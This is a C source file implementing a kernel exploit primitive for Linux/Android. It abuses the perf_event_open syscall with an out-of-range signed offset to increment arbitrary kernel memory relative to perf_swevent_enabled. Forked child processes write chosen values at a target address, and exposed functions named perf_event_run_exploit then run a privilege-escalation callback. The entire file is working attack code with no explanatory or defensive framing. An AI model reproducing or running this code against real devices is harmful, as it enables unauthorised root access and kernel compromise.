#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <device_database.h>
#include "perf_event.h"

#define PERF_SWEVENT_MAX_FILE 980

#ifndef __NR_perf_event_open
#define __NR_perf_event_open   (__NR_SYSCALL_BASE+364)
#endif

static unsigned long int
get_perf_swevent_enabled_address(void)
{
  unsigned long int value;

  value = device_get_symbol_address(DEVICE_SYMBOL(perf_swevent_enabled));
  if (value) {
    return value;
  }

  print_reason_device_not_supported();

  return 0;
}

static bool
syscall_perf_event_open(uint32_t offset)
{
  uint64_t buf[10] = { 0x4800000001, offset, 0, 0, 0, 0x300 };
  int fd;

  fd = syscall(__NR_perf_event_open, buf, 0, -1, -1, 0);
  if (fd < 0) {
    fprintf(stderr, "Error %s\n", strerror(errno));
  }

  return (fd > 0);
}

static pid_t *child_process;
static int current_process_number;

enum {
  READ_END,
  WRITE_END,
};

static pid_t
prepare_pipes(int *read_fd)
{
  pid_t pid;
  int stdout_pipe[2];

  if (pipe(stdout_pipe) < 0) {
    return -1;
  }

  pid = fork();
  if (pid == -1) {
    return -1;
  } else if (pid == 0) {
    close(stdout_pipe[READ_END]);

    dup2(stdout_pipe[WRITE_END], STDOUT_FILENO);

    if (stdout_pipe[WRITE_END] >= 3) {
      close(stdout_pipe[WRITE_END]);
    }
  } else {
    close(stdout_pipe[WRITE_END]);
    *read_fd = stdout_pipe[READ_END];
  }

  return pid;
}

static pid_t
increment_value_at_offset_in_child_process(int offset, int count, int *child_fd)
{
  int i = 0;
  pid_t pid;

  offset |= 0x80000000;

  pid = prepare_pipes(child_fd);
  if (pid == 0) {
    for (i = 0; i < count; i++) {
      syscall_perf_event_open(offset);
    }
    printf("Done\n");
  }
  return pid;
}

typedef pid_t (*increment_function) (unsigned long int address, int count, int *child_fd);

static pid_t
increment_address_value_in_child_process(unsigned long int address, int count, int *child_fd)
{
  unsigned long int perf_swevent_enabled;
  int offset;
  int i = 0;
  pid_t pid;

  perf_swevent_enabled = get_perf_swevent_enabled_address();
  if (!perf_swevent_enabled) {
    return -1;
  }

  offset = (int)(address - perf_swevent_enabled) / 4;

  return increment_value_at_offset_in_child_process(offset, count, child_fd);
}

#define MIN(x,y) (((x)<(y))?(x):(y))
#define BUFFER_SIZE 5
static int
perf_event_write_value_at(unsigned long int address, int value,
                          pid_t (*increment_function)(unsigned long int address, int count, int *child_fd))
{
  int number_of_children;

  current_process_number = 0;
  number_of_children = value / PERF_SWEVENT_MAX_FILE + 1;
  child_process = (pid_t*)malloc(number_of_children * sizeof(pid_t));

  while (value > 0) {
    char buffer[BUFFER_SIZE];
    int child_fd;
    int min = MIN(value, PERF_SWEVENT_MAX_FILE);
    pid_t pid = increment_function(address, min, &child_fd);
    if (pid <= 0) {
      return (int)pid;
    }
    read(child_fd, buffer, sizeof(buffer));
    close(child_fd);
    child_process[current_process_number] = pid;
    current_process_number++;
    value -= PERF_SWEVENT_MAX_FILE;
  }

  return current_process_number;
}

int
perf_event_write_value_at_address(unsigned long int address, int value)
{
  return perf_event_write_value_at(address, value,
                                   increment_address_value_in_child_process);
}

int
perf_event_write_value_at_offset(int offset, int value)
{
  return perf_event_write_value_at(offset, value,
                                   (increment_function)increment_value_at_offset_in_child_process);
}

void
perf_event_reap_child_process(int number)
{
  int i;

  for (i = 0; i < number; i++) {
    kill(child_process[i], SIGKILL);
  }

  sleep(1);

  for (i = 0; i < number; i++) {
    int status;
    waitpid(child_process[i], &status, WNOHANG);
  }

  free(child_process);
}

static bool
perf_event_run_exploit_with(unsigned long int address, int value,
                            bool(*exploit_callback)(void* user_data), void *user_data,
                            increment_function increment_function)
{
  int number_of_children;
  bool success;

  number_of_children = perf_event_write_value_at(address, value,
                                                 increment_function);
  if (number_of_children < 0) {
    return false;
  }

  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  success = exploit_callback(user_data);

  perf_event_reap_child_process(number_of_children);

  return success;
}

bool
perf_event_run_exploit(unsigned long int address, int value,
                       bool(*exploit_callback)(void* user_data), void *user_data)
{
  return perf_event_run_exploit_with(address, value, exploit_callback, user_data,
                                     increment_address_value_in_child_process);
}

bool
perf_event_run_exploit_with_offset(int offset, int value,
                                   bool(*exploit_callback)(void* user_data), void *user_data)
{
  return perf_event_run_exploit_with(offset, value, exploit_callback, user_data,
                                     (increment_function)increment_value_at_offset_in_child_process);
}

/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
